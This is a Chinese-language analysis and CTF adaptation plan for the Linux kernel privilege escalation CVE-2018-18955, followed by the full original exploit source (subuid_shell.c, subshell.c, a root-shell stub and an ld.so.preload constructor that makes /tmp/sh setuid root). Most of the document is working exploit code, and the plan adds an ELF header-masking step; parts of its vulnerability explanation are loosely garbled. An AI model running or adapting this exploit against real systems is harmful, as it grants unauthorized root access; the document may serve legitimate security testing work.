# CVE-2018-18955 漏洞技术分析与PoC改造计划

## 漏洞概述

| 属性 | 值 |
|------|-----|
| CVE ID | CVE-2018-18955 |
| CVSS | 7.8 |
| 严重等级 | CRITICAL |
| 漏洞类型 | User Namespace Privilege Escalation |
| 影响内核版本 | 4.15.0 ~ 4.19.1 |
| 利用技术 | map_write()函数中user namespace UID/GID范围处理缺陷 |

## 原始PoC分析

### 参考来源
- **PoC URL**: https://github.com/bcoles/kernel-exploits/blob/master/CVE-2018-18955/poc.c
- **来源类型**: GitHub

### 利用原理
kernel/user_namespace.c中map_write()函数错误处理超过5个UID/GID范围的嵌套user namespace，导致权限提升。

该漏洞的触发条件为user namespace嵌套超过5个UID/GID范围。攻击者通过精心构造的系统调用序列，利用User Namespace Privilege Escalation类型的缺陷，在内核空间中实现代码执行或数据篡改。

利用过程中，关键的内存操作为UID映射表溢出覆盖权限数据。最终的提权路径通过通过嵌套user namespace绕过UID映射限制获得root完成，使非特权用户获得root权限。

### 关键技术点
1. user namespace嵌套超过5个UID/GID范围
2. UID映射表溢出覆盖权限数据
3. 通过嵌套user namespace绕过UID映射限制获得root

## PoC改造计划

### CTF挑战模式适配
- **推荐测试模式**: write_root_file
- **模式选择理由**: 用户命名空间UID映射绕过可直接获得root权限，具备任意文件写入能力

### CLI参数规范化
PoC需支持以下标准CLI参数：
- `--mode`: 测试模式 (read_root_file/write_root_file)
- `--root-file`: root权限目标文件路径
- `--write-value`: write模式的写入值 (ctf{...})
- `--log-file`: syscall日志文件路径
- `--verbose`: 详细输出开关

### 输出协议
CTF协议输出：
```
CTF_FLAG:<value>           // 挑战成功
CTF_FAIL:<reason>          // 漏洞未触发
CTF_UNSUPPORTED:<mode>:<reason> // 不支持的模式
```

### 三阶段验证集成
- **Phase 1 (Prepare)**: 创建嵌套user namespace环境
- **Phase 2 (Run)**: 写入超长UID/GID映射触发map_write缺陷
- **Phase 3 (Post)**: 验证提权结果、清理嵌套namespace

### Syscall日志记录
关键syscall需要记录到log-file：
- `unshare`
- `clone`
- `open`
- `write`

## 改造要点

### 核心修改
1. 改造namespace利用为CTF验证
2. 添加CLI参数解析
3. 添加namespace清理逻辑

### 安全约束
- 执行超时: 30秒
- 禁止 rm -rf
- 禁止写 /etc
- 执行后清理临时ELF

### 编译要求
- 编译器: gcc
- 目标架构: x86_64
- 静态链接: 推荐 `-static`
- ELF掩蔽: 编译后前4字节替换为 `CVE\x00`

## Original PoC Source Code

Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712

```c
// subuid_shell.c - Linux local root exploit for CVE-2018-18955
// Exploits broken uid/gid mapping in nested user namespaces.
// ---
// Mostly stolen from Jann Horn's exploit:
// - https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
// Some code stolen from Xairy's exploits:
// - https://github.com/xairy/kernel-exploits
// ---
// <bcoles@gmail.com>
// - added auto subordinate id mapping
// https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-18955

#define _GNU_SOURCE

#include <unistd.h>
#include <fcntl.h>
#include <grp.h>
#include <pwd.h>
#include <sched.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/prctl.h>

#define DEBUG

#ifdef DEBUG
#  define dprintf printf
#else
#  define dprintf
#endif

char* SUBSHELL = "./subshell";


// * * * * * * * * * * * * * * * * * File I/O * * * * * * * * * * * * * * * * *

#define CHUNK_SIZE 1024

int read_file(const char* file, char* buffer, int max_length) {
  int f = open(file, O_RDONLY);
  if (f == -1)
    return -1;
  int bytes_read = 0;
  while (1) {
    int bytes_to_read = CHUNK_SIZE;
    if (bytes_to_read > max_length - bytes_read)
      bytes_to_read = max_length - bytes_read;
    int rv = read(f, &buffer[bytes_read], bytes_to_read);
    if (rv == -1)
      return -1;
    bytes_read += rv;
    if (rv == 0)
      return bytes_read;
  }
}

static int write_file(const char* file, const char* what, ...) {
  char buf[1024];
  va_list args;
  va_start(args, what);
  vsnprintf(buf, sizeof(buf), what, args);
  va_end(args);
  buf[sizeof(buf) - 1] = 0;
  int len = strlen(buf);

  int fd = open(file, O_WRONLY | O_CLOEXEC);
  if (fd == -1)
    return -1;
  if (write(fd, buf, len) != len) {
    close(fd);
    return -1;
  }
  close(fd);
  return 0;
}


// * * * * * * * * * * * * * * * * * Map * * * * * * * * * * * * * * * * *

int get_subuid(char* output, int max_length) {
  char buffer[1024];
  char* path = "/etc/subuid";
  int length = read_file(path, &buffer[0], sizeof(buffer));
  if (length == -1)
    return -1;

  int real_uid = getuid();
  struct passwd *u = getpwuid(real_uid);

  char needle[1024];
  sprintf(needle, "%s:", u->pw_name);
  int needle_length = strlen(needle);
  char* found = memmem(&buffer[0], length, needle, needle_length);
  if (found == NULL)
    return -1;

  int i;
  for (i = 0; found[needle_length + i] != ':'; i++) {
    if (i >= max_length)
      return -1;
    if ((found - &buffer[0]) + needle_length + i >= length)
      return -1;
    output[i] = found[needle_length + i];
  }

  return 0;
}

int get_subgid(char* output, int max_length) {
  char buffer[1024];
  char* path = "/etc/subgid";
  int length = read_file(path, &buffer[0], sizeof(buffer));
  if (length == -1)
    return -1;

  int real_gid = getgid();
  struct group *g = getgrgid(real_gid);

  char needle[1024];
  sprintf(needle, "%s:", g->gr_name);
  int needle_length = strlen(needle);
  char* found = memmem(&buffer[0], length, needle, needle_length);
  if (found == NULL)
    return -1;

  int i;
  for (i = 0; found[needle_length + i] != ':'; i++) {
    if (i >= max_length)
      return -1;
    if ((found - &buffer[0]) + needle_length + i >= length)
      return -1;
    output[i] = found[needle_length + i];
  }

  return 0;
}


// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * *

int main(int argc, char** argv) {
  if (argc > 1) SUBSHELL = argv[1];

  dprintf("[.] starting\n");

  dprintf("[.] setting up namespace\n");

  int sync_pipe[2];
  char dummy;

  if (socketpair(AF_UNIX, SOCK_STREAM, 0, sync_pipe)) {
    dprintf("[-] pipe\n");
    exit(EXIT_FAILURE);
  }

  pid_t child = fork();

  if (child == -1) {
    dprintf("[-] fork");
    exit(EXIT_FAILURE);
  }

  if (child == 0) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    close(sync_pipe[1]);

    if (unshare(CLONE_NEWUSER) != 0) {
      dprintf("[-] unshare(CLONE_NEWUSER)\n");
      exit(EXIT_FAILURE);
    }

    if (unshare(CLONE_NEWNET) != 0) {
      dprintf("[-] unshare(CLONE_NEWNET)\n");
      exit(EXIT_FAILURE);
    }

    if (write(sync_pipe[0], "X", 1) != 1) {
      dprintf("write to sock\n");
      exit(EXIT_FAILURE);
    }

    if (read(sync_pipe[0], &dummy, 1) != 1) {
      dprintf("[-] read from sock\n");
      exit(EXIT_FAILURE);
    }

    if (setgid(0)) {
      dprintf("[-] setgid");
      exit(EXIT_FAILURE);
    }

    if (setuid(0)) {
      printf("[-] setuid");
      exit(EXIT_FAILURE);
    }

    execl(SUBSHELL, "", NULL);

    dprintf("[-] executing subshell failed\n");
  }

  close(sync_pipe[0]);

  if (read(sync_pipe[1], &dummy, 1) != 1) {
    dprintf("[-] read from sock\n");
    exit(EXIT_FAILURE);
  }

  char path[256];
  sprintf(path, "/proc/%d/setgroups", (int)child);

  if (write_file(path, "deny") == -1) {
    dprintf("[-] denying setgroups failed\n");
    exit(EXIT_FAILURE);
  }

  dprintf("[~] done, namespace sandbox set up\n");

  dprintf("[.] mapping subordinate ids\n");
  char subuid[64];
  char subgid[64];

  if (get_subuid(&subuid[0], sizeof(subuid))) {
    dprintf("[-] couldn't find subuid map in /etc/subuid\n");
    exit(EXIT_FAILURE);
  }

  if (get_subgid(&subgid[0], sizeof(subgid))) {
    dprintf("[-] couldn't find subgid map in /etc/subgid\n");
    exit(EXIT_FAILURE);
  }

  dprintf("[.] subuid: %s\n", subuid);
  dprintf("[.] subgid: %s\n", subgid);

  char cmd[256];

  sprintf(cmd, "newuidmap %d 0 %s 1000", (int)child, subuid);
  if (system(cmd))  {
    dprintf("[-] newuidmap failed");
    exit(EXIT_FAILURE);
  }

  sprintf(cmd, "newgidmap %d 0 %s 1000", (int)child, subgid);
  if (system(cmd)) {
    dprintf("[-] newgidmap failed");
    exit(EXIT_FAILURE);
  }

  dprintf("[~] done, mapped subordinate ids\n");

  dprintf("[.] executing subshell\n");

  if (write(sync_pipe[1], "X", 1) != 1) {
    dprintf("[-] write to sock");
    exit(EXIT_FAILURE);
  }

  int status;
  if (wait(&status) != child) {
    dprintf("[-] wait");
    exit(EXIT_FAILURE);
  }

  return 0;
}
// subshell.c
// author: Jann Horn
// source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712

#define _GNU_SOURCE
#include <unistd.h>
#include <grp.h>
#include <err.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sched.h>
#include <sys/wait.h>

int main() {
  int sync_pipe[2];
  char dummy;
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, sync_pipe)) err(1, "pipe");

  pid_t child = fork();
  if (child == -1) err(1, "fork");
  if (child == 0) {
    close(sync_pipe[1]);
    if (unshare(CLONE_NEWUSER)) err(1, "unshare userns");
    if (write(sync_pipe[0], "X", 1) != 1) err(1, "write to sock");

    if (read(sync_pipe[0], &dummy, 1) != 1) err(1, "read from sock");
    execl("/bin/bash", "bash", NULL);
    err(1, "exec");
  }

  close(sync_pipe[0]);
  if (read(sync_pipe[1], &dummy, 1) != 1) err(1, "read from sock");
  char pbuf[100];
  sprintf(pbuf, "/proc/%d", (int)child);
  if (chdir(pbuf)) err(1, "chdir");
  const char *id_mapping = "0 0 1\n1 1 1\n2 2 1\n3 3 1\n4 4 1\n5 5 995\n";
  int uid_map = open("uid_map", O_WRONLY);
  if (uid_map == -1) err(1, "open uid map");
  if (write(uid_map, id_mapping, strlen(id_mapping)) != strlen(id_mapping)) err(1, "write uid map");
  close(uid_map);
  int gid_map = open("gid_map", O_WRONLY);
  if (gid_map == -1) err(1, "open gid map");
  if (write(gid_map, id_mapping, strlen(id_mapping)) != strlen(id_mapping)) err(1, "write gid map");
  close(gid_map);
  if (write(sync_pipe[1], "X", 1) != 1) err(1, "write to sock");

  int status;
  if (wait(&status) != child) err(1, "wait");
  return 0;
}
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0);
  setgid(0);
  execl("/bin/bash", "bash", NULL);
}
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

void init(void) __attribute__((constructor));                                                             

void __attribute__((constructor)) init() {
  setuid(0);
  setgid(0);
  unlink("/etc/ld.so.preload");
  system("chown root:root /tmp/sh");
  system("chmod u+s /tmp/sh");
  _exit(0);
}
```

